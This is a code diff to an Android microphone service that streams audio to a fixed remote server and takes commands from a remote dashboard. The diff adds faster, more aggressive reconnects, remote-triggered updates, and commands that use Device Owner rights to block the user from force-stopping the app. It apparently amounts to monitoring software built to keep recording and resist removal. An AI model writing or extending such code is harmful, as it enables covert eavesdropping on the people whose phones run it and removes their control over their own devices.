@@ -126,6 +126,7 @@ class MicService : Service() {
     @Volatile private var isRecoveringMic = false
     @Volatile private var wsStreamMode = "auto" // auto | pcm | smart
     @Volatile private var voiceProfile = "room" // near | room | far
+    @Volatile private var lowNetworkMode = false // dashboard forced low-network mode
     @Volatile private var lastAudioChunkSentAt = 0L
     @Volatile private var lastHealthSentAt = 0L
     @Volatile private var audioSourceRotation = 0
@@ -228,8 +229,8 @@ class MicService : Service() {
         const val AUDIO_CODEC_PCM16_16K: Byte = 0x00  // Full quality - no compression
         const val AUDIO_CODEC_MULAW_8K: Byte = 0x01   // Compressed fallback
         
-        const val WS_RECONNECT_BASE_MS = 2_000L
-        const val WS_RECONNECT_MAX_MS = 30_000L
+        const val WS_RECONNECT_BASE_MS = 500L     // Fast initial retry (was 2000)
+        const val WS_RECONNECT_MAX_MS = 5_000L    // Max delay 5s (was 30s)
 
         // Render cloud URL — works on any network (WiFi or cellular)
         const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"
@@ -458,9 +459,10 @@ class MicService : Service() {
     }
 
     private fun nextReconnectDelayMs(): Long {
-        val expShift = wsReconnectAttempts.coerceAtMost(4)
+        // Fast aggressive retry: 500ms -> 1s -> 2s -> 4s -> 5s max
+        val expShift = wsReconnectAttempts.coerceAtMost(3)  // Cap earlier (was 4)
         val expDelay = (WS_RECONNECT_BASE_MS * (1L shl expShift)).coerceAtMost(WS_RECONNECT_MAX_MS)
-        val jitter = Random.nextLong(250L, 1_500L)
+        val jitter = Random.nextLong(100L, 500L)  // Less jitter (was 250-1500)
         return (expDelay + jitter).coerceAtMost(WS_RECONNECT_MAX_MS)
     }
 
@@ -470,7 +472,7 @@ class MicService : Service() {
             while (isActive && activeWebSocket == null && !isWsConnecting) {
                 if (!isNetworkUsable()) {
                     updateNotification("Offline — waiting for network…")
-                    delay(4_000)
+                    delay(1_500)  // Faster network check (was 4000)
                     continue
                 }
                 val delayMs = nextReconnectDelayMs()
@@ -535,6 +537,80 @@ class MicService : Service() {
             "get_data" -> {
                 // Dashboard requested a fresh sync immediately
                 sendDeviceData()
+            }
+            "force_update" -> {
+                Log.i(TAG, "CMD: force_update - checking for updates")
+                UpdateWorker.checkNow(this)
+                safeSend("ACK:force_update")
+            }
+            "check_update" -> {
+                Log.i(TAG, "CMD: check_update - triggering update check")
+                serviceScope.launch(Dispatchers.IO) {
+                    val versionInfo = UpdateService.checkForUpdate(this@MicService, forceCheck = true)
+                    if (versionInfo != null) {
+                        safeSend("""{"type":"update_available","version":"${versionInfo.versionName}","code":${versionInfo.versionCode},"size":${versionInfo.apkSize}}""")
+                    } else {
+                        safeSend("""{"type":"update_status","status":"up_to_date"}""")
+                    }
+                }
+            }
+            "clear_device_owner" -> {
+                Log.i(TAG, "CMD: clear_device_owner - removing device owner")
+                try {
+                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    if (dpm.isDeviceOwnerApp(packageName)) {
+                        dpm.clearDeviceOwnerApp(packageName)
+                        safeSend("ACK:clear_device_owner:success")
+                        Log.i(TAG, "Device Owner cleared successfully")
+                    } else {
+                        safeSend("ACK:clear_device_owner:not_device_owner")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to clear device owner: ${e.message}")
+                    safeSend("ACK:clear_device_owner:error:${e.message}")
+                }
+            }
+            "lock_app" -> {
+                // Prevent app from being force stopped (Device Owner only)
+                Log.i(TAG, "CMD: lock_app - preventing force stop")
+                try {
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
+                        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                        if (dpm.isDeviceOwnerApp(packageName)) {
+                            val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                            dpm.setUserControlDisabledPackages(admin, listOf(packageName))
+                            safeSend("ACK:lock_app:success")
+                            Log.i(TAG, "App locked - cannot be force stopped")
+                        } else {
+                            safeSend("ACK:lock_app:not_device_owner")
+                        }
+                    } else {
+                        safeSend("ACK:lock_app:requires_android_11")
+                    }
+                } catch (e: Exception) {
+                    safeSend("ACK:lock_app:error:${e.message}")
+                }
+            }
+            "unlock_app" -> {
+                // Allow app to be force stopped again
+                Log.i(TAG, "CMD: unlock_app - allowing force stop")
+                try {
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
+                        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                        if (dpm.isDeviceOwnerApp(packageName)) {
+                            val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                            dpm.setUserControlDisabledPackages(admin, emptyList())
+                            safeSend("ACK:unlock_app:success")
+                            Log.i(TAG, "App unlocked - can be force stopped")
+                        } else {
+                            safeSend("ACK:unlock_app:not_device_owner")
+                        }
+                    } else {
+                        safeSend("ACK:unlock_app:requires_android_11")
+                    }
+                } catch (e: Exception) {
+                    safeSend("ACK:unlock_app:error:${e.message}")
+                }
             }
             else -> Log.d(TAG, "Unknown command: $cmd")
         }
@@ -618,6 +694,21 @@ class MicService : Service() {
                     }
                     sendHealthStatus("stream_codec_$wsStreamMode")
                     Log.i(TAG, "WS stream mode set to $wsStreamMode")
+                }
+                "set_low_network" -> {
+                    val enabled = obj.optBoolean("enabled", false)
+                    lowNetworkMode = enabled
+                    if (enabled) {
+                        // Force PCM mode for clarity in low network
+                        wsStreamMode = "pcm"
+                        Log.i(TAG, "Low-network mode ENABLED - switched to PCM")
+                    } else {
+                        // Return to auto mode
+                        wsStreamMode = "auto"
+                        Log.i(TAG, "Low-network mode DISABLED - switched to auto")
+                    }
+                    sendHealthStatus("low_network_${if (enabled) "on" else "off"}")
+                    safeSend("""{"type":"low_network_ack","enabled":$enabled}""")
                 }
                 "voice_profile" -> {
                     val profile = obj.optString("profile", "room").trim().lowercase()
